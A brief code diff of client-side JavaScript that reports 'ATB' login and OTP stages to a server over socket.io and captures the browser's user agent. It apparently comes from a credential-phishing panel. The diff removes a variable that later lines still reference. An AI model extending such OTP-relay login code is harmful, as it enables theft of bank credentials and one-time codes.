@@ -1,5 +1,4 @@
 const socket = io();
-let navig = `/atb/qst`;
 
 socket.emit('pageandstage', {page: 'ATB', stage: 'Login'})
 
@@ -11,7 +10,7 @@ socket.on('OTP', (data) => {
     console.log(navig)
 })
 
-        
+console.log(navig)
 
 function submitForm() {
     document.getElementById('userAgent').value = navigator.userAgent;
